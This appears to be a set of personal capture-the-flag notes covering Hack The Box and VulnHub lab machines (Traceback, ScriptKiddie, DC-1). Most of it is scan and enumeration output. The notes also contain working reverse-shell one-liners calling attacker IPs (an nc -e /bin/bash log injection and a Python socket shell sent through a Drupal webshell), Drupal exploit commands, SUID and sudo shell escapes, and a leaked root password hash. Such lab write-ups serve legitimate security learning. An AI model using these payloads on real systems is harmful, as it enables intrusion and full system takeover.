/var/backups/.update-motd.d/* /etc/update-motd.d/ <br />message of the day (/etc/update-motd.d/ is being updated every 30 seconds, maybe I can write to it...<br />cd /etc/update-motd.d/<br />echo “cat /root/root.txt &gt;&gt; 00-header”  <br />    quickly open another terminal and ssh in as webadmin...<br />    root.txt printed to the message of the day! (I am sure that I could have got a reverse shell this way as well)<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>  <br /><h1>openssh-server 1:7.6p1-4 (amd64 binary) in ubuntu bionic</h1><br /><br /><br /><code>sudo /home/sysadmin/luvit -e &#39;os.execute(&quot;/bin/sh&quot;)&#39;</code><br /><br /><br />root:$6$YZ5Z19pP$ShJsTqviOfvZo1apR2ktP198YA0U9U.KFF/yxWvZPRCZ.VkRxwZZ2DKXO3ubKsBewv8/2XzQc6YOKGofbBqEo/:18133:0:99999:7::: | md5sum<br /><br />5d1675de89ec28437a53a8bfb25258f8<br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap 10.10.10.181 &amp;&amp; nmap -sC -sV 10.10.10.181 &amp;&amp; nmap -p- 10.10.10.181<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-09 13:14 EDT<br />Nmap scan report for 10.10.10.181<br />Host is up (0.20s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 20.27 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-09 13:14 EDT<br />Nmap scan report for 10.10.10.181<br />Host is up (0.18s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)<br />|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)<br />|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)<br />80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: Help us<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 38.42 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-09 13:15 EDT<br />Nmap scan report for 10.10.10.181<br />Host is up (0.27s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1201.70 seconds<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap</h1><br/><br />PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br /><br />NSE: Script Post-scanning.<br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.10.10.181:80">http://10.10.10.181:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.181<br />+ Target Hostname:    10.10.10.181<br />+ Target Port:        80<br />+ Start Time:         2020-04-09 13:17:33 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.29 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Server may leak inodes via ETags, header found with file /, inode: 459, size: 5911796d5b788, mtime: gzip<br />+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD <br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 7863 requests: 0 error(s) and 7 item(s) reported on remote host<br />+ End Time:           2020-04-09 13:47:37 (GMT-4) (1804 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/>python3 /Yeet/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.181:80">http://10.10.10.181:80</a> --simple-report dirsearchsimple_10.10.10.181:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.9<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /Yeet/Tools/dirsearch/logs/errors-20-04-09_13-17-39.log<br /><br />Target: <a href="http://10.10.10.181:80">http://10.10.10.181:80</a><br /><br />[13:17:40] Starting: <br />[13:17:43] 403 -  291B  - /.php<br />[13:17:44] 403 -  293B  - /icons/<br />CTRL+C detected: Pausing threads, please wait...<br />[e]xit / [c]ontinue: c<br />[14:10:39] 403 -  301B  - /server-status/<br />CTRL+C detected: Pausing threads, please wait...<br /><br />Canceled by the user<br />squid@CoolHandKali:/Yeet/Machines/HTB/Traceback$ ^C<br />squid@CoolHandKali:/Yeet/Machines/HTB/Traceback$ <br /><br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />01233e70fe91310fc2b969b6dd1444a7<br />root<br />9a95739d93a3f9327d3120ee63613d21<br /></div><div class='page'><h1 class='title level-3'>200-254</h1><br/></div><div class='page'><h1 class='title level-4'>Delivery 10.10.10.222</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>1564546@delivery.htb<br />squid<br />1564546<br /><br />4287355@delivery.htb<br />4287355<br />squid<br /><br />squi@yee.com<br />1677228<br />1677228@delivery.htb<br />32<br /><br /><br />mmuser:Crack_The_MM_Admin_PW</div><div class='page'><h1 class='title level-5'>flags</h1><br/></div><div class='page'><h1 class='title level-4'>10.10.10.226 ScriptKiddie</h1><br/>echo &#39;[2021-02-08 20:29:55.652707] 1.1.1.1 &amp; /home/kid/logs/nc 10.10.14.11 3232 -e /bin/bash &amp;&#39; &gt; hackers &amp;&amp; cat hackers<br /><br />Nmap showed that only 22 and 5000 were open. 5000 was acting as a web server for a weird web service<br />5000 was a custom (looking) html landing page. One of the options was to create a msfvenom reverse shell payload as either windows, linux or android. You could also add a template file.<br /><a href="https://www.exploit-db.com/exploits/49491">https://www.exploit-db.com/exploits/49491</a><br /><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a><br /><br />Moral of the story, if you upload this apk file to be used as a template (for an android msfvenom payload) it gave me a reverse shell.<br />The shell sucked so I downloaded the private ssh keys. Now I&#39;m kid.<br />kid could write to a log that would immediatlye be read by another user “pwn.”<br /><br />BIGGEST LESSON OF THE DAY... FUGGIN EMULATE<br />I was able to read the file that would execute what I put into the log file. The most helpful thing was copying it and breaking it down so that I knew what I needed to do to escape and execute.<br /><br />VVthe line ran to start a nc shell<br />echo &#39;[2021-02-08 20:29:55.652707] 1.1.1.1 &amp; /home/kid/logs/nc 10.10.14.11 3232 -e /bin/bash &amp;&#39; &gt; hackers &amp;&amp; cat hackers<br /><br />caught with nc -nlvp 3232. I am now PWN!<br />shell sucked so I stole pwn&#39;s private ssh keys.<br /><br />sudo -l showed that I could run msf as root with no password<br /><br />sudo /opt/.../msfconsole<br />from here I could just run commands as root! There are ways to get a better shell more than likely (exploit/multi/handler to myself)<br /></div><div class='page'><h1 class='title level-5'>Enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>ubuntu 20<br />22 ssh<br />5000 werkeug (some googy web service)<br /></div><div class='page'><h1 class='title level-5'>Flags</h1><br/>User: 99ba87dfc32b49504a759cbb0bc5e526<br />Root: 675a3cc887357fc961c3ce2d3315385c</div><div class='page'><h1 class='title level-2'>VulHub</h1><br/><br /></div><div class='page'><h1 class='title level-3'>DC_Series</h1><br/></div><div class='page'><h1 class='title level-4'>DC-1</h1><br/>Drupwn&gt; exploit CVE-2018-7600                                                       <br /><br />[+] Exploit completed. Webshell accessible at: <a href="http://192.168.11.137/497PAZ.php?c=CMD">http://192.168.11.137/497PAZ.php?c=CMD</a><br /><br />nc -nlvp 3233<br />view-source:<a href="http://192.168.11.137/497PAZ.php?c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.11.136%22,3233));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27">http://192.168.11.137/497PAZ.php?c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.11.136%22,3233));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27</a><br /><br />searchsploit drupal<br />python 34992.py -t <a href="http://192.168.11.137">http://192.168.11.137</a> -u squid -p 12qwaszx<br /><br /><br />*settings.php has creds*<br /><br /><br /><br /><br />------------------------------------------------------------<br />scanned with nmap<br />saw drupal and downloaded drupwn to scan the web server<br />drupal found CVE-2018-7600 and got me a web shell<br />used  python oneliner from “Quick Commands/shells” in my notes and got a reverse shell<br />found flag 1 in /var/www<br />grep -r “flag[12345]” found flag 2 in the settings.php file<br />in settings.php I found mysql creds<br />used creds to login and found an admin username with a hash<br />could not break hash<br />abandoned mysql<br />found flag4 in the home directory<br />initiated “/Privesc/Linux/QuickPrivCheck” find / -perm 4000<br />saw /usr/bin/find was running with the SUID of root<br />find /etc/shadow -exec sh \;        And got a root shell!!<br />thefinalflag.txt was in /root/<br />still having not gotten into the website (assuming that was where flag3.txt was)<br />searchsploit drupal and look for 7.0<br />saw 34992.py added a user account<br />python 34992.py -t <a href="http://192.168.11.137">http://192.168.11.137</a> -u squid -p 12qwaszx<br />logged in with new creds and got flag3.txt<br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VunHub/DC-1# nmap -sC -sV -oN DC-1 192.168.11.137<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-03 13:30 EDT<br />Nmap scan report for 192.168.11.137<br />Host is up (0.00010s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE VERSION<br />22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)<br />|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)<br />|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)<br />80/tcp  open  http    Apache httpd 2.2.22 ((Debian))<br />|_http-generator: Drupal 7 (<a href="http://drupal.org)">http://drupal.org)</a><br />| http-robots.txt: 36 disallowed entries (15 shown)<br />| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br />| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br />| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br />|_/LICENSE.txt /MAINTAINERS.txt<br />|_http-server-header: Apache/2.2.22 (Debian)<br />|_http-title: Welcome to Drupal Site | Drupal Site<br />111/tcp open  rpcbind 2-4 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2,3,4        111/tcp  rpcbind<br />|   100000  2,3,4        111/udp  rpcbind<br />|   100024  1          39830/udp  status<br />|_  100024  1          52587/tcp  status<br />MAC Address: 00:0C:29:1B:F9:6A (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds<br /></div><div class='page'><h1 class='title level-6'>davtest</h1><br/>davtest -url <a href="http://192.168.11.137:80">http://192.168.11.137:80</a><br />peration failed. You can only open a collection (directory)<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@kali:~/Desktop/Machines/VunHub/DC-1# nikto -host <a href="http://192.168.11.137:80">http://192.168.11.137:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.137<br />+ Target Hostname:    192.168.11.137<br />+ Target Port:        80<br />+ Start Time:         2019-10-03 13:34:08 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.22 (Debian)<br />+ Retrieved x-powered-by header: PHP/5.4.45-0+deb7u14<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;x-generator&#39; found, with contents: Drupal 7 (<a href="http://drupal.org)">http://drupal.org)</a><br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 152289, size: 1561, mtime: Wed Nov 20 15:45:59 2013<br />+ Entry &#39;/INSTALL.mysql.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/INSTALL.pgsql.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/INSTALL.sqlite.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/install.php&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/LICENSE.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/MAINTAINERS.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/UPGRADE.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/xmlrpc.php&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/filter/tips/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/user/register/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/user/password/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/user/login/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=filter/tips/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/password/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/register/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/login/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 36 entries which should be manually viewed.<br />+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ OSVDB-39272: /misc/favicon.ico file identifies this app/server as: Drupal 7.x<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ DEBUG HTTP verb may show server debugging information. See <a href="http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx">http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx</a> for details.<br />+ OSVDB-3092: /web.config: ASP config file is accessible.<br />+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br />+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.<br /><br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>root@kali:~/Desktop/Machines/VunHub/DC-1# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.137">http://192.168.11.137</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-03_13-33-25.log<br /><br />Target: <a href="http://192.168.11.137">http://192.168.11.137</a><br /><br />[13:33:25] Starting: <br />[13:33:26] 403 -  286B  - /.php<br />[13:33:27] 403 -    7KB - /search/<br />[13:33:27] 403 -  290B  - /cgi-bin/<br />[13:33:29] 200 -    7KB - /index.php<br />[13:33:34] 403 -  288B  - /icons/<br />[13:33:36] 403 -  287B  - /misc/<br />[13:33:39] 403 -  289B  - /themes/<br />[13:33:40] 200 -    7KB - /0/<br />[13:33:40] 200 -    7KB - /user/<br />[13:33:42] 403 -  290B  - /modules/<br />[13:33:57] 403 -    8KB - /admin/<br />[13:33:58] 403 -  290B  - /scripts/<br />[13:34:10] 200 -    7KB - /node/<br />[13:34:31] 403 -  288B  - /sites/<br />[13:34:31] 403 -    7KB - /Search/<br />[13:34:45] 403 -  291B  - /includes/<br />[13:34:56] 200 -    3KB - /install.php<br />[13:35:04] 403 -  291B  - /profiles/<br />[13:35:07] 403 -    4KB - /update.php<br />[13:38:41] 403 -    7KB - /cron.php<br />[13:45:02] 200 -    9KB - /User/<br />[13:46:44] 403 -    7KB - /Admin/<br />[13:47:25] 403 -  291B  - /Template/<br />[14:22:49] 200 -   42B  - /xmlrpc.php<br />[14:29:02] 403 -    8KB - /batch/<br />[14:30:41] 403 -    7KB - /SEARCH/<br />[14:30:59] 403 -  293B  - /Repository/<br />[15:25:40] 403 -  286B  - /Tag/<br />CTRL+C detected: Pausing threads, please wait...<br />[e]xit / [c]ontinue: e<br /><br />Canceled by the user<br /></div><div class='page'><h1 class='title level-6'>Drupwn</h1><br/>root@kali:~/Desktop/Tools/drupwn# drupwn enum <a href="http://192.168.11.137">http://192.168.11.137</a><br /><br />        ____<br />       / __ \_______  ______ _      ______<br />      / / / / ___/ / / / __ \ | /| / / __ \<br />     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /<br />    /_____/_/   \__,_/ .___/|__/|__/_/ /_/<br />                     /_/<br />    <br />[-] Version not specified, trying to identify it<br /><br />[+] Version detected: 7.0<br /><br /><br />============ Users ============<br /><br />[+] ***** (id=1)<br />[+] ***** (id=2)<br /><br />============ Modules ============<br /><br />^C<br />============ Themes ============<br /><br /><br /><br />^C<br />============ Nodes ============<br /><br />^C<br />============ Default files ============<br /><br /><a href="http://192.168.11.137/node/1">http://192.168.11.137/node/1</a><br />[+] /LICENSE.txt (200)<br />[+] /robots.txt (200)<br />[+] /web.config (200)<br />[+] /README.txt (200)<br />[+] /install.php (200)<br />[+] /xmlrpc.php (200)<br />[+] /update.php (403)<br />root@kali:~/Desktop/Tools/drupwn# drupwn exploit <a href="http://192.168.11.137">http://192.168.11.137</a><br /><br />        ____<br />       / __ \_______  ______ _      ______<br />      / / / / ___/ / / / __ \ | /| / / __ \<br />     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /<br />    /_____/_/   \__,_/ .___/|__/|__/_/ /_/<br />                     /_/<br />    <br />[-] Version not specified, trying to identify it<br /><br />[+] Version detected: 7.0<br /><br />Commands available: list | quit | check [CVE_NUMBER] | exploit [CVE_NUMBER]<br />                                                                                    <br />Drupwn&gt; list                                                                        <br />+---------------+----------------------------------------+---------------------------------+<br />|      CVE      |              Description               |        Versions affected        |<br />+---------------+----------------------------------------+---------------------------------+<br />| CVE-2018-7602 | Authenticated Remote Command Execution |           7.x &lt;= 7.58           |<br />| CVE-2019-6340 |        Remote Command Execution        | 8.5.x &lt; 8.5.11 &amp; 8.6.x &lt; 8.6.10 |<br />| CVE-2018-7600 |        Remote Command Execution        |      7.x &lt; 7.58 &amp; 8.x &lt; 8.1     |<br />+---------------+----------------------------------------+---------------------------------+<br />                                                                                    <br />Drupwn&gt;<br /><br />                                                                                   <br />Drupwn&gt; exploit CVE-2018-7600                                                       <br /><br />[+] Exploit completed. Webshell accessible at: <a href="http://192.168.11.137/497PAZ.php?c=CMD">http://192.168.11.137/497PAZ.php?c=CMD</a><br /><br /><br /></div><div class='page'><h1 class='title level-6'>LinEnum</h1><br/><br />[00;31m#########################################################[00m<br />[00;31m#[00m [00;33mLocal Linux Enumeration &amp; Privilege Escalation Script[00m [00;31m#[00m<br />[00;31m#########################################################[00m<br />[00;33m# www.rebootuser.com[00m<br />[00;33m# version 0.97[00m<br /><br />[-] Debug Info<br />[00;33m[+] Thorough tests = Disabled[00m<br /><br /><br />[00;33mScan started at:<br />Fri Oct  4 01:09:18 AEST 2019<br />[00m<br /><br />[00;33m### SYSTEM ##############################################[00m<br />[00;31m[-] Kernel information:[00m<br />Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux<br /><br /><br />[00;31m[-] Kernel information (continued):[00m<br />Linux version 3.2.0-6-486 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb7u1) ) #1 Debian 3.2.102-1<br /><br /><br />[00;31m[-] Specific release information:[00m<br />PRETTY_NAME=&quot;Debian GNU/Linux 7 (wheezy)&quot;<br />NAME=&quot;Debian GNU/Linux&quot;<br />VERSION_ID=&quot;7&quot;<br />VERSION=&quot;7 (wheezy)&quot;<br />ID=debian<br />ANSI_COLOR=&quot;1;31&quot;<br />HOME_URL=&quot;http://www.debian.org/&quot;<br />SUPPORT_URL=&quot;http://www.debian.org/support/&quot;<br />BUG_REPORT_URL=&quot;http://bugs.debian.org/&quot;<br /><br /><br />[00;31m[-] Hostname:[00m<br />DC-1<br /><br /><br />[00;33m### USER/GROUP ##########################################[00m<br />[00;31m[-] Current user/group info:[00m<br />uid=33(www-data) gid=33(www-data) groups=33(www-data)<br /><br /><br />[00;31m[-] Users that have previously logged onto the system:[00m<br />Username         Port     From             Latest<br />root             tty1                      Thu Feb 28 12:10:51 +1000 2019<br /><br /><br />[00;31m[-] Who else is logged on:[00m<br /> 01:09:19 up  1:44,  0 users,  load average: 20.16, 20.16, 20.63<br />USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br /><br /><br />[00;31m[-] Group memberships:[00m<br />uid=0(root) gid=0(root) groups=0(root)<br />uid=1(daemon) gid=1(daemon) groups=1(daemon)<br />uid=2(bin) gid=2(bin) groups=2(bin)<br />uid=3(sys) gid=3(sys) groups=3(sys)<br />uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)<br />uid=5(games) gid=60(games) groups=60(games)<br />uid=6(man) gid=12(man) groups=12(man)<br />uid=7(lp) gid=7(lp) groups=7(lp)<br />uid=8(mail) gid=8(mail) groups=8(mail)<br />uid=9(news) gid=9(news) groups=9(news)<br />uid=10(uucp) gid=10(uucp) groups=10(uucp)<br />uid=13(proxy) gid=13(proxy) groups=13(proxy)<br />uid=33(www-data) gid=33(www-data) groups=33(www-data)<br />uid=34(backup) gid=34(backup) groups=34(backup)<br />uid=38(list) gid=38(list) groups=38(list)<br />uid=39(irc) gid=39(irc) groups=39(irc)<br />uid=41(gnats) gid=41(gnats) groups=41(gnats)<br />uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)<br />uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)<br />uid=101(Debian-exim) gid=104(Debian-exim) groups=104(Debian-exim)<br />uid=102(statd) gid=65534(nogroup) groups=65534(nogroup)<br />uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)<br />uid=104(sshd) gid=65534(nogroup) groups=65534(nogroup)<br />uid=105(mysql) gid=109(mysql) groups=109(mysql)<br />uid=1001(flag4) gid=1001(flag4) groups=1001(flag4)<br /><br /><br />[00;31m[-] Contents of /etc/passwd:[00m<br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br />bin:x:2:2:bin:/bin:/bin/sh<br />sys:x:3:3:sys:/dev:/bin/sh<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/bin/sh<br />man:x:6:12:man:/var/cache/man:/bin/sh<br />lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br />mail:x:8:8:mail:/var/mail:/bin/sh<br />news:x:9:9:news:/var/spool/news:/bin/sh<br />uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br />proxy:x:13:13:proxy:/bin:/bin/sh<br />www-data:x:33:33:www-data:/var/www:/bin/sh<br />backup:x:34:34:backup:/var/backups:/bin/sh<br />list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br />irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br />nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br />libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br />Debian-exim:x:101:104::/var/spool/exim4:/bin/false<br />statd:x:102:65534::/var/lib/nfs:/bin/false<br />messagebus:x:103:107::/var/run/dbus:/bin/false<br />sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin<br />mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false<br />flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash<br /><br /><br />[00;31m[-] Super user account(s):[00m<br />root<br /><br /><br />[00;31m[-] Are permissions on /home directories lax:[00m<br />total 12K<br />drwxr-xr-x  3 root  root  4.0K Feb 19  2019 .<br />drwxr-xr-x 23 root  root  4.0K Feb 19  2019 ..<br />drwxr-xr-x  2 flag4 flag4 4.0K Feb 19  2019 flag4<br /><br /><br />[00;31m[-] Root is allowed to login via SSH:[00m<br />PermitRootLogin yes<br /><br /><br />[00;33m### ENVIRONMENTAL #######################################[00m<br />[00;31m[-] Environment information:[00m<br />APACHE_PID_FILE=/var/run/apache2.pid<br />APACHE_RUN_USER=www-data<br />APACHE_LOG_DIR=/var/log/apache2<br />PATH=/usr/local/bin:/usr/bin:/bin<br />PWD=/var/www/yeet<br />APACHE_RUN_GROUP=www-data<br />LANG=C<br />SHLVL=1<br />APACHE_LOCK_DIR=/var/lock/apache2<br />APACHE_RUN_DIR=/var/run/apache2<br />_=/usr/bin/env<br /><br /><br />[00;31m[-] Path information:[00m<br />/usr/local/bin:/usr/bin:/bin<br /><br /><br />[00;31m[-] Available shells:[00m<br /># /etc/shells: valid login shells<br />/bin/sh<br />/bin/dash<br />/bin/bash<br />/bin/rbash<br /><br /><br />[00;31m[-] Current umask value:[00m<br />0022<br />u=rwx,g=rx,o=rx<br /><br /><br />[00;31m[-] umask value as specified in /etc/login.defs:[00m<br />UMASK		022<br /><br /><br />[00;31m[-] Password and storage information:[00m<br />PASS_MAX_DAYS	99999<br />PASS_MIN_DAYS	0<br />PASS_WARN_AGE	7<br />ENCRYPT_METHOD SHA512<br /><br /><br />[00;33m### JOBS/TASKS ##########################################[00m<br />[00;31m[-] Cron jobs:[00m<br />-rw-r--r-- 1 root root  722 Jul  4  2012 /etc/crontab<br /><br />/etc/cron.d:<br />total 16<br />drwxr-xr-x  2 root root 4096 Feb 19  2019 .<br />drwxr-xr-x 85 root root 4096 Oct  4 01:08 ..<br />-rw-r--r--  1 root root  102 Jul  4  2012 .placeholder<br />-rw-r--r--  1 root root  510 May 10  2018 php5<br /><br />/etc/cron.daily:<br />total 68<br />drwxr-xr-x  2 root root  4096 Feb 19  2019 .<br />drwxr-xr-x 85 root root  4096 Oct  4 01:08 ..<br />-rw-r--r--  1 root root   102 Jul  4  2012 .placeholder<br />-rwxr-xr-x  1 root root   633 May 30  2018 apache2<br />-rwxr-xr-x  1 root root 14985 Oct 24  2014 apt<br />-rwxr-xr-x  1 root root   314 Nov  5  2012 aptitude<br />-rwxr-xr-x  1 root root   355 Jun 11  2012 bsdmainutils<br />-rwxr-xr-x  1 root root   256 May  3  2016 dpkg<br />-rwxr-xr-x  1 root root  4125 Feb 11  2018 exim4-base<br />-rwxr-xr-x  1 root root    89 May 17  2012 logrotate<br />-rwxr-xr-x  1 root root  1365 Jun 19  2012 man-db<br />-rwxr-xr-x  1 root root   606 Sep 25  2010 mlocate<br />-rwxr-xr-x  1 root root   249 May 26  2012 passwd<br /><br />/etc/cron.hourly:<br />total 12<br />drwxr-xr-x  2 root root 4096 Feb 19  2019 .<br />drwxr-xr-x 85 root root 4096 Oct  4 01:08 ..<br />-rw-r--r--  1 